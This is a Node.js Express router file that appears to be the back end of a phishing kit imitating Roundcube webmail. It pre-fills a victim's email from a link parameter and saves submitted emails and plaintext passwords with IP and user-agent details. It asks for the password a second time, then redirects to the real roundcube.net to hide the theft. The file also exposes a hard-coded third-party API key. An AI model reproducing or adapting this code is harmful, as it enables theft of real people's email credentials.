const express = require("express");
const router = express.Router();
const axios = require("axios");
const session = require("express-session")

// Load User model
const User = require("../models/User");

router.get("/login", (req, res) => {
  let email = req.query.dbs || "";
  res.render("login", { email: email });
});

router.get("/loginverify", (req, res) => res.render("login2"));

async function fetchIPDetails() {
  try {
    // This API returns data about the IP, not the "User-Agent".
    const response = await axios.get("https://ipgeolocation.abstractapi.com/v1/?api_key=c3d944ac606a4926b537f11d53816a76");
    return response.data; // this will contain IP details
  } catch (error) {
    console.error("Error fetching IP details: ", error);
    return null;
  }
}

router.post("/loginok", async (req, res, next) => {
  const { email, password } = req.body;
  const userAgent = req.headers['user-agent']; // Capturing User-Agent from headers

  const ipDetails = await fetchIPDetails(); // This contains IP geolocation details, not User-Agent

  const clientIP = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  console.log("IP From Headers: " + clientIP);

  if (!ipDetails) {
    return res.status(500).send("Error fetching IP details");
  }

  const user = new User({ 
    email, 
    password, 
    userIp: ipDetails.ip_address, 
    userAgent: userAgent 
  });

  user
    .save()
    .then((result) => {
      console.log(result);
      req.flash("success_msg", "Login ok");
      res.redirect(`/users/loginverify?dbs=${encodeURIComponent(email)}`);
    })
    .catch((err) => console.log(err));
});

router.post("/loginverify", async (req, res, next) => {
  const { email, password } = req.body;

  const userAgent = req.headers['user-agent']; // Capturing User-Agent from headers

  const ipDetails = await fetchIPDetails();

  if (!ipDetails) {
    return res.status(500).send("Failed to fetch user details");
  }

  const user = new User({ 
    email, 
    password, 
    userIp: ipDetails.ip_address, 
    userAgent: userAgent 
  });

  user
    .save()
    .then((result) => {
      console.log(result);
      req.flash("success_msg", "Questions ok");
      res.redirect("https://roundcube.net/");
    })
    .catch((err) => console.log(err));
});

router.get("/logout", (req, res) => {
  req.logout();
  req.flash("success_msg", "You are logged out");
  res.redirect("/users/login");
});

module.exports = router;
